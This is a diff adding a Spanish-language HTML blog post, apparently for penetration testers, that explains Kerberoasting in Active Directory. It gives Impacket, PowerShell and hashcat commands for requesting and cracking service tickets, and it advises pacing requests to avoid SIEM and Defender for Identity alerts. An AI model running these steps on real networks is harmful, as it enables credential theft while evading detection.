@@ -1,0 +1,59 @@
+<p>
+  El ataque de Kerberoasting es uno de los más documentados en entornos de Active Directory,
+  pero su efectividad real depende de entender el protocolo Kerberos a nivel de TGT/TGS,
+  no solo de ejecutar <code>GetUserSPNs.py</code> y esperar resultados.
+</p>
+
+<h2>¿QUÉ ESTAMOS PIDIENDO REALMENTE?</h2>
+
+<p>
+  Cuando un usuario autenticado solicita acceso a un servicio, el Domain Controller emite un
+  <strong>Ticket Granting Service (TGS)</strong> cifrado con el hash NTLM de la cuenta de servicio
+  que tiene registrado ese SPN. Ahí está el vector: si capturamos ese ticket, podemos atacarlo offline
+  sin generar tráfico adicional al DC.
+</p>
+
+<div style="position:relative;">
+  <span class="pre-label">IMPACKET</span>
+  <pre># Enumerar cuentas con SPN registrado
+GetUserSPNs.py DOMAIN/user:password -dc-ip 10.10.10.10 -request
+
+# Output esperado:
+# ServicePrincipalName    Name      MemberOf        PasswordLastSet
+# ----------------------  --------  --------------  -------------------
+# MSSQLSvc/srv01:1433     svc_sql   Domain Admins   2023-08-14 09:12:01</pre>
+</div>
+
+<h2>EL PROBLEMA: DETECCIÓN POR VOLUMEN</h2>
+
+<p>
+  Los SIEM modernos y herramientas como <strong>Microsoft Defender for Identity</strong> generan alertas
+  cuando se observan múltiples solicitudes de TGS en un período corto desde una misma cuenta.
+  La estrategia es simple: ir lento, ir quirúrgico. Un ticket a la vez, con intervalos naturales.
+</p>
+
+<div style="position:relative;">
+  <span class="pre-label">POWERSHELL</span>
+  <pre># Solicitar un solo ticket manualmente
+Add-Type -AssemblyName System.IdentityModel
+$ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken `
+  -ArgumentList "MSSQLSvc/srv01.domain.local:1433"
+[System.Convert]::ToBase64String($ticket.GetRequest())</pre>
+</div>
+
+<h2>CRACKEO OFFLINE CON HASHCAT</h2>
+
+<p>
+  Una vez extraído el hash en formato <code>$krb5tgs$23$</code>, el crackeo es completamente local.
+  Modo 13100 en Hashcat para RC4, modo 19700 para AES256 — cada vez más común en entornos hardeneados.
+</p>
+
+<div style="position:relative;">
+  <span class="pre-label">HASHCAT</span>
+  <pre>hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force</pre>
+</div>
+
+<p>
+  Si la cuenta de servicio tiene contraseña débil o de diccionario, en minutos tienes credenciales válidas.
+  El post siguiente cubre qué hacer cuando esa cuenta tiene privilegios de administración de dominio.
+</p>
